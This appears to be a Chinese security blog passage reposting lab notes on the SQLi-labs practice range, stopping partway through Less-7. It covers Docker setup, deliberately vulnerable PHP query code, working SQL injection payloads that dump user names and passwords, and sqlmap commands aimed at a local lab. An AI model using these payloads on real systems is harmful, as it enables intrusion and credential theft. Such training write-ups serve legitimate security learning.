<!DOCTYPE HTML>
<html lang="zh-CN">


<head>
    <meta charset="utf-8">
    <meta name="keywords" content="SQLI-labs靶场学习记录, JAVA、Web安全、代码审计、免杀">
    <meta name="description" content="逆风的方向更适合飞翔">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <!-- Global site tag (gtag.js) - Google Analytics -->


    <title>SQLI-labs靶场学习记录 | F10Sec</title>
    <link rel="icon" type="image/png" href="https://cdn.jsdelivr.net/gh/F10Sec/F10Sec.github.io/favicon.png">

    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/F10Sec/F10Sec.github.io/libs/awesome/css/all.css">
    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/F10Sec/F10Sec.github.io/libs/materialize/materialize.min.css">
    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/F10Sec/F10Sec.github.io/libs/aos/aos.css">
    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/F10Sec/F10Sec.github.io/libs/animate/animate.min.css">
    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/F10Sec/F10Sec.github.io/libs/lightGallery/css/lightgallery.min.css">
    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/F10Sec/F10Sec.github.io/css/matery.css">
    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/F10Sec/F10Sec.github.io/css/my.css">

    <script src="https://cdn.jsdelivr.net/gh/F10Sec/F10Sec.github.io/libs/jquery/jquery.min.js"></script>

<meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="F10Sec" type="application/atom+xml">
</head>



   <style>
    body{
       background-image: url(https://cdn.jsdelivr.net/gh/Tokisaki-Galaxy/res/site/medias/background.jpg);
       background-repeat:no-repeat;
       background-size:cover;
       background-attachment:fixed;
    }
</style>



<body>
    <header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                    
                    <img src="https://cdn.jsdelivr.net/gh/F10Sec/F10Sec.github.io/medias/logo.png" class="logo-img" alt="LOGO">
                    
                    <span class="logo-span">F10Sec</span>
                </a>
            </div>
            

<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
<ul class="right nav-menu">
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/" class="waves-effect waves-light">
      
      <i class="fas fa-home" style="zoom: 0.6;"></i>
      
      <span>首页</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/tags" class="waves-effect waves-light">
      
      <i class="fas fa-tags" style="zoom: 0.6;"></i>
      
      <span>标签</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/categories" class="waves-effect waves-light">
      
      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
      
      <span>分类</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/archives" class="waves-effect waves-light">
      
      <i class="fas fa-archive" style="zoom: 0.6;"></i>
      
      <span>归档</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/about" class="waves-effect waves-light">
      
      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
      
      <span>关于</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/contact" class="waves-effect waves-light">
      
      <i class="fas fa-comments" style="zoom: 0.6;"></i>
      
      <span>留言板</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/friends" class="waves-effect waves-light">
      
      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
      
      <span>友情链接</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="" class="waves-effect waves-light">

      
      <i class="fas fa-list" style="zoom: 0.6;"></i>
      
      <span>工具箱</span>
      <i class="fas fa-chevron-down" aria-hidden="true" style="zoom: 0.6;"></i>
    </a>
    <ul class="sub-nav menus_item_child ">
      
      <li>
        <a href="/reverse-shell-generator">
          
          <i class="fas fa-film" style="margin-top: -20px; zoom: 0.6;"></i>
          
          <span>反弹shell生成</span>
        </a>
      </li>
      
      <li>
        <a target="_blank" rel="noopener" href="https://www.digitalocean.com/community/tools/nginx?global.app.lang=zhCN">
          
          <i class="fas fa-film" style="margin-top: -20px; zoom: 0.6;"></i>
          
          <span>Nginx配置生成</span>
        </a>
      </li>
      
      <li>
        <a href="/get-av-list">
          
          <i class="fas fa-film" style="margin-top: -20px; zoom: 0.6;"></i>
          
          <span>Win杀软识别</span>
        </a>
      </li>
      
      <li>
        <a target="_blank" rel="noopener" href="https://i.hacking8.com/tiquan">
          
          <i class="fas fa-film" style="margin-top: -20px; zoom: 0.6;"></i>
          
          <span>Win提权辅助</span>
        </a>
      </li>
      
    </ul>
    
  </li>
  
  <li>
    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
    </a>
  </li>
</ul>


<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <img src="https://cdn.jsdelivr.net/gh/F10Sec/F10Sec.github.io/medias/logo.png" class="logo-img circle responsive-img">
        
        <div class="logo-name">F10Sec</div>
        <div class="logo-desc">
            
            逆风的方向更适合飞翔
            
        </div>
    </div>

    

    <ul class="menu-list mobile-menu-list">
        
        <li class="m-nav-item">
	  
		<a href="/" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-home"></i>
			
			首页
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/tags" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-tags"></i>
			
			标签
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/categories" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-bookmark"></i>
			
			分类
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/archives" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-archive"></i>
			
			归档
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/about" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-user-circle"></i>
			
			关于
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/contact" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-comments"></i>
			
			留言板
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/friends" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-address-book"></i>
			
			友情链接
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="javascript:;">
			
				<i class="fa-fw fas fa-list"></i>
			
			工具箱
			<span class="m-icon"><i class="fas fa-chevron-right"></i></span>
		</a>
            <ul  style="background:  ;" >
              
                <li>

                  <a href="/reverse-shell-generator " style="margin-left:50px">
				  
				   <i class="fa fas fa-film" style="position: absolute;left:28px" ></i>
			      
		          <span>反弹shell生成</span>
                  </a>
                </li>
              
                <li>

                  <a target="_blank" rel="noopener" href="https://www.digitalocean.com/community/tools/nginx?global.app.lang=zhCN " style="margin-left:50px">
				  
				   <i class="fa fas fa-film" style="position: absolute;left:28px" ></i>
			      
		          <span>Nginx配置生成</span>
                  </a>
                </li>
              
                <li>

                  <a href="/get-av-list " style="margin-left:50px">
				  
				   <i class="fa fas fa-film" style="position: absolute;left:28px" ></i>
			      
		          <span>Win杀软识别</span>
                  </a>
                </li>
              
                <li>

                  <a target="_blank" rel="noopener" href="https://i.hacking8.com/tiquan " style="margin-left:50px">
				  
				   <i class="fa fas fa-film" style="position: absolute;left:28px" ></i>
			      
		          <span>Win提权辅助</span>
                  </a>
                </li>
              
            </ul>
          
        </li>
        
        
        <li><div class="divider"></div></li>
        <li>
            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
                <i class="fab fa-github-square fa-fw"></i>Fork Me
            </a>
        </li>
        
    </ul>
</div>


        </div>

        
            <style>
    .nav-transparent .github-corner {
        display: none !important;
    }

    .github-corner {
        position: absolute;
        z-index: 10;
        top: 0;
        right: 0;
        border: 0;
        transform: scale(1.1);
    }

    .github-corner svg {
        color: #0f9d58;
        fill: #fff;
        height: 64px;
        width: 64px;
    }

    .github-corner:hover .octo-arm {
        animation: a 0.56s ease-in-out;
    }

    .github-corner .octo-arm {
        animation: none;
    }

    @keyframes a {
        0%,
        to {
            transform: rotate(0);
        }
        20%,
        60% {
            transform: rotate(-25deg);
        }
        40%,
        80% {
            transform: rotate(10deg);
        }
    }
</style>

<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
   data-tooltip="Fork Me" data-position="left" data-delay="50">
    <svg viewBox="0 0 250 250" aria-hidden="true">
        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
              fill="currentColor" class="octo-body"></path>
    </svg>
</a>
        
    </nav>

</header>

    
<script src="https://cdn.jsdelivr.net/gh/F10Sec/F10Sec.github.io/libs/cryptojs/crypto-js.min.js"></script>
<script>
    (function() {
        let pwd = '';
        if (pwd && pwd.length > 0) {
            if (pwd !== CryptoJS.SHA256(prompt('请输入访问本文章的密码')).toString(CryptoJS.enc.Hex)) {
                alert('密码错误，将返回主页！');
                location.href = '/';
            }
        }
    })();
</script>




<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/F10Sec/F10Sec.github.io/medias/featureimages/5.jpg')">
    <div class="container" style="right: 0px;left: 0px;">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <h1 class="description center-align post-title">SQLI-labs靶场学习记录</h1>
                </div>
            </div>
        </div>
    </div>
</div>




<main class="post-container content">

    
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/F10Sec/F10Sec.github.io/libs/tocbot/tocbot.css">
<style>
    #articleContent h1::before,
    #articleContent h2::before,
    #articleContent h3::before,
    #articleContent h4::before,
    #articleContent h5::before,
    #articleContent h6::before {
        display: block;
        content: " ";
        height: 100px;
        margin-top: -100px;
        visibility: hidden;
    }

    #articleContent :focus {
        outline: none;
    }

    .toc-fixed {
        position: fixed;
        top: 64px;
    }

    .toc-widget {
        width: 345px;
        padding-left: 20px;
    }

    .toc-widget .toc-title {
        padding: 35px 0 15px 17px;
        font-size: 1.5rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    .toc-widget ol {
        padding: 0;
        list-style: none;
    }

    #toc-content {
        padding-bottom: 30px;
        overflow: auto;
    }

    #toc-content ol {
        padding-left: 10px;
    }

    #toc-content ol li {
        padding-left: 10px;
    }

    #toc-content .toc-link:hover {
        color: #42b983;
        font-weight: 700;
        text-decoration: underline;
    }

    #toc-content .toc-link::before {
        background-color: transparent;
        max-height: 25px;

        position: absolute;
        right: 23.5vw;
        display: block;
    }

    #toc-content .is-active-link {
        color: #42b983;
    }

    #floating-toc-btn {
        position: fixed;
        right: 15px;
        bottom: 76px;
        padding-top: 15px;
        margin-bottom: 0;
        z-index: 998;
    }

    #floating-toc-btn .btn-floating {
        width: 48px;
        height: 48px;
    }

    #floating-toc-btn .btn-floating i {
        line-height: 48px;
        font-size: 1.4rem;
    }
</style>
<div class="row">
    <div id="main-content" class="col s12 m12 l9">
        <!-- 文章内容详情 -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                    <div class="article-tag">
                        
                            <a href="/tags/SQLI-labs-%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/">
                                <span class="chip bg-color">SQLI-labs 靶场学习</span>
                            </a>
                        
                    </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                </div>
            </div>

            <div class="post-info">
                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
                    2022-01-20
                </div>
                

                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
                    2022-01-20
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
                    15.6k
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
                    69 分
                </div>
                

                
                    <div id="busuanzi_container_page_pv" class="info-break-policy">
                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
                        <span id="busuanzi_value_page_pv"></span>
                    </div>
				
            </div>
        </div>
        <hr class="clearfix">

        
        <!-- 是否加载使用自带的 prismjs. -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/F10Sec/F10Sec.github.io/libs/prism/prism.css">
        

        
        <!-- 代码块折行 -->
        <style type="text/css">
            code[class*="language-"], pre[class*="language-"] { white-space: pre-wrap !important; }
        </style>
        

        <div class="card-content article-card-content">
            <div id="articleContent">
                <p>备注：转载至国光大佬的笔记；</p>
<p>SQLi Labs 是一个比较全面的手工注入练习靶场，因为很全面，很少有人可以坚持做完，建议坚持打一遍秉做好笔记；</p>
<h1 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h1><p><strong>项目地址</strong>：<a target="_blank" rel="noopener" href="https://github.com/Audi-1/sqli-labs">https://github.com/Audi-1/sqli-labs</a></p>
<p>Sqli-labs 是一个开源且全面的 SQL 注入练习靶场，手工注入必备的练习环境；</p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>安装使用 Docker 就比较简单省事儿，直接在 dockerhub 搜索，找下载量比较高（<a target="_blank" rel="noopener" href="https://hub.docker.com/r/acgpiano/sqli-labs">acgpiano/sqli-labs</a>）的来安装：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> pull acgpiano/sqli-labs
<span class="token function">docker</span> run -dt --name sqli-lab -p <span class="token number">8888</span>:80 acgpiano/sqli-labs:latest<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>自己将<code>8888</code>修改成自己需要映射的端口，这个容器默认是<strong>没初始化</strong> SQLi-labs 数据库的，所以得自己初始化一下。</p>
<p>通过查看容器里面的配置文件，发现 MySQL 的 root 用户的密码为 <code>空</code>，相关版本的细节如下：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ mysql -e <span class="token string">"select version(),user()"</span>
+-------------------------+----------------+
<span class="token operator">|</span> version<span class="token punctuation">(</span><span class="token punctuation">)</span>               <span class="token operator">|</span> user<span class="token punctuation">(</span><span class="token punctuation">)</span>         <span class="token operator">|</span>
+-------------------------+----------------+
<span class="token operator">|</span> <span class="token number">5.5</span>.44-0ubuntu0.14.04.1 <span class="token operator">|</span> root@localhost <span class="token operator">|</span>
+-------------------------+----------------+

$ php --version
PHP <span class="token number">5.5</span>.9-1ubuntu4.13 <span class="token punctuation">(</span>cli<span class="token punctuation">)</span> <span class="token punctuation">(</span>built: Sep <span class="token number">29</span> <span class="token number">2015</span> <span class="token number">15</span>:24:49<span class="token punctuation">)</span>
Copyright <span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token number">1997</span>-2014 The PHP Group
Zend Engine v2.5.0, Copyright <span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token number">1998</span>-2014 Zend Technologies
    with Zend OPcache v7.0.3, Copyright <span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token number">1999</span>-2014, by Zend Technologies

$ <span class="token builtin class-name">cd</span> /etc/init.d/ <span class="token operator">&amp;&amp;</span> apache2 -v
Server version: Apache/2.4.7 <span class="token punctuation">(</span>Ubuntu<span class="token punctuation">)</span>
Server built:   Oct <span class="token number">14</span> <span class="token number">2015</span> <span class="token number">14</span>:20:21

$ <span class="token function">uname</span> -a
Linux 5fd18b4e45eb <span class="token number">4.19</span>.76-linuxkit <span class="token comment">#1 SMP Fri Apr 3 15:53:26 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>新版的 Docker 是支持图形化 Dashboard 管理容器的；</p>
<p><img src="https://image.3001.net/images/20200513/15893551932887.png" alt="img"></p>
<h2 id="效率必备"><a href="#效率必备" class="headerlink" title="效率必备"></a>效率必备</h2><ul>
<li>抓包工具 Burpsuite，因为后面有 POST 注入，抓包方便分析</li>
<li>老版本的 Hackerbar，半自动化手工注入必备</li>
</ul>
<h1 id="基础挑战-1-20-关"><a href="#基础挑战-1-20-关" class="headerlink" title="基础挑战 1-20 关"></a>基础挑战 1-20 关</h1><h2 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h2><table>
<thead>
<tr>
<th align="left">请求方式</th>
<th align="left">注入类型</th>
<th align="left">拼接方式</th>
</tr>
</thead>
<tbody><tr>
<td align="left">GET</td>
<td align="left">联合、报错、布尔盲注、延时盲注</td>
<td align="left"><code>id=&#39;$id&#39;</code></td>
</tr>
</tbody></table>
<p><strong>源码简单分析</strong>：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment"># 单引号拼接</span>
<span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT * FROM users WHERE id='<span class="token interpolation"><span class="token variable">$id</span></span>' LIMIT 0,1"</span><span class="token punctuation">;</span>

<span class="token comment"># 支持联合、报错、布尔盲注、延时盲注</span>
<span class="token keyword">if</span> <span class="token constant boolean">true</span><span class="token punctuation">:</span>
    输出查询内容
<span class="token keyword">else</span><span class="token punctuation">:</span>
    <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h3><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">payload：
	?id&#x3D;-1&#39;+UNION+SELECT+1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users)--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h3 id="报错注入1"><a href="#报错注入1" class="headerlink" title="报错注入1"></a>报错注入1</h3><p>手动修改 <code>LIMIT+0,1</code> 来进行结果偏移</p>
<pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">payload：
?id&#x3D;1&#39;+AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(CONCAT(username,password)+AS+CHAR),0x7e))+FROM+users+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h3 id="报错注入2"><a href="#报错注入2" class="headerlink" title="报错注入2"></a>报错注入2</h3><p>手动修改 <code>LIMIT+0,1</code> 来进行结果偏移</p>
<pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">payload：
?id&#x3D;1&#39;+AND(SELECT+1+FROM(SELECT+count(*),CONCAT((SELECT+(SELECT+(SELECT+CONCAT(0x7e,0x27,cast(username+AS+CHAR),0x27,0x7e)+FROM+users+LIMIT+0,1))+FROM+INFORMATION_SCHEMA.TABLES+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)+AND+1&#x3D;1--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>数据库第一个字母为 <code>s</code></p>
<pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">payload：
?id&#x3D;1&#39; and left(database(),1)&gt;&#39;r&#39;--+
?id&#x3D;1&#39; and left(database(),1)&gt;&#39;s&#39;--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h3 id="延时盲注"><a href="#延时盲注" class="headerlink" title="延时盲注"></a>延时盲注</h3><p>数据库第一个字母的 ascii 码为 115，即<code>s</code></p>
<pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">?id&#x3D;1&#39; and if(ascii(substr(database(),1,1))&gt;114,1,sleep(5))--+
?id&#x3D;1&#39; and if(ascii(substr(database(),1,1))&gt;115,1,sleep(5))--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h3 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h3><p><strong>联合查询注入</strong></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap -u <span class="token string">"http://127.0.0.1:8888/Less-1/?id=1"</span> --dbms<span class="token operator">=</span>MySQL --random-agent --flush-session --technique<span class="token operator">=</span>U -v <span class="token number">3</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><strong>报错注入</strong></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap -u <span class="token string">"http://127.0.0.1:8888/Less-1/?id=1"</span> --dbms<span class="token operator">=</span>MySQL --random-agent --flush-session --technique<span class="token operator">=</span>E -v <span class="token number">3</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><strong>布尔盲注</strong></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap -u <span class="token string">"http://127.0.0.1:8888/Less-1/?id=1"</span> --dbms<span class="token operator">=</span>MySQL --random-agent --flush-session --technique<span class="token operator">=</span>B -v <span class="token number">3</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><strong>延时盲注</strong></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap -u <span class="token string">"http://127.0.0.1:8888/Less-1/?id=1"</span> --dbms<span class="token operator">=</span>MySQL --random-agent --flush-session --technique<span class="token operator">=</span>T -v <span class="token number">3</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h2><table>
<thead>
<tr>
<th align="left">请求方式</th>
<th align="left">注入类型</th>
<th align="left">拼接方式</th>
</tr>
</thead>
<tbody><tr>
<td align="left">GET</td>
<td align="left">联合、报错、布尔盲注、延时盲注</td>
<td align="left"><code>id=$id</code></td>
</tr>
</tbody></table>
<p>和 Less-1 利用方式一致，只是闭合方式不一样而已，这里即不再啰嗦了。</p>
<h2 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h2><table>
<thead>
<tr>
<th align="left">请求方式</th>
<th align="left">注入类型</th>
<th align="left">拼接方式</th>
</tr>
</thead>
<tbody><tr>
<td align="left">GET</td>
<td align="left">联合、报错、布尔盲注、延时盲注</td>
<td align="left"><code>id=(&#39;$id&#39;)</code></td>
</tr>
</tbody></table>
<p>和 Less-1 利用方式一致，只是闭合方式不一样而已，这里即不再啰嗦了。</p>
<h2 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h2><table>
<thead>
<tr>
<th align="left">请求方式</th>
<th align="left">注入类型</th>
<th align="left">拼接方式</th>
</tr>
</thead>
<tbody><tr>
<td align="left">GET</td>
<td align="left">联合、报错、布尔盲注、延时盲注</td>
<td align="left"><code>id=(&quot;$id&quot;)</code></td>
</tr>
</tbody></table>
<p><strong>源码简单分析</strong>：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment"># 先双引号 在括号拼接</span>
<span class="token variable">$id</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'"'</span> <span class="token operator">.</span> <span class="token variable">$id</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'"'</span><span class="token punctuation">;</span>
<span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT * FROM users WHERE id=(<span class="token interpolation"><span class="token variable">$id</span></span>) LIMIT 0,1"</span><span class="token punctuation">;</span>

<span class="token comment"># 支持联合、报错、布尔盲注、延时盲注</span>
<span class="token keyword">if</span> <span class="token constant boolean">true</span><span class="token punctuation">:</span>
    输出查询内容
<span class="token keyword">else</span><span class="token punctuation">:</span>
    <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h2><table>
<thead>
<tr>
<th align="left">请求方式</th>
<th align="left">注入类型</th>
<th align="left">拼接方式</th>
</tr>
</thead>
<tbody><tr>
<td align="left">GET</td>
<td align="left">报错、布尔盲注、延时盲注</td>
<td align="left"><code>id=&#39;$id&#39;</code></td>
</tr>
</tbody></table>
<p><strong>源码简单分析</strong>：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment"># 直接单引号拼接</span>
<span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT * FROM users WHERE id='<span class="token interpolation"><span class="token variable">$id</span></span>' LIMIT 0,1"</span><span class="token punctuation">;</span>

<span class="token comment"># 支持报错、布尔盲注、延时盲注</span>
<span class="token keyword">if</span> <span class="token constant boolean">true</span><span class="token punctuation">:</span>
    输出 You are in<span class="token operator">...</span><span class="token operator">...</span><span class="token operator">...</span><span class="token operator">.</span><span class="token operator">.</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>因为不输出查询的结果，这就导致不可以使用联合查询的注入方式，但是并不影响正常使用报错、布尔盲注和延时盲注，除了不能联合查询注入，其他和 Less-1 利用方式一致，这里即不再啰嗦了。</p>
<h2 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h2><table>
<thead>
<tr>
<th align="left">请求方式</th>
<th align="left">注入类型</th>
<th align="left">拼接方式</th>
</tr>
</thead>
<tbody><tr>
<td align="left">GET</td>
<td align="left">报错、布尔盲注、延时盲注</td>
<td align="left"><code>id=&quot;$id&quot;</code></td>
</tr>
</tbody></table>
<p>和 Less-5 利用方式一致，只是闭合方式不一样，这里即不再啰嗦了。</p>
<h2 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h2><table>
<thead>
<tr>
<th align="left">请求方式</th>
<th align="left">注入类型</th>
<th align="left">拼接方式</th>
</tr>
</thead>
<tbody><tr>
<td align="left">GET</td>
<td align="left">布尔盲注、延时盲注</td>
<td align="left"><code>id=((&#39;$id&#39;))</code></td>
</tr>
</tbody></table>
<p><strong>源码简单分析</strong>：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment"># 使用单引号加双层括号拼接</span>
<span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT * FROM users WHERE id=(('<span class="token interpolation"><span class="token variable">$id</span></span>')) LIMIT 0,1"</span><span class="token punctuation">;</span>

<span class="token comment"># 支持布尔盲注、延时盲注</span>
<span class="token keyword">if</span> <span class="token constant boolean">true</span><span class="token punctuation">:</span>
    输出 You are in<span class="token operator">...</span><span class="token operator">.</span> <span class="token keyword">Use</span> <span class="token package">outfile</span><span class="token operator">...</span><span class="token operator">...</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    输出 You have an error in your <span class="token constant">SQL</span> syntax
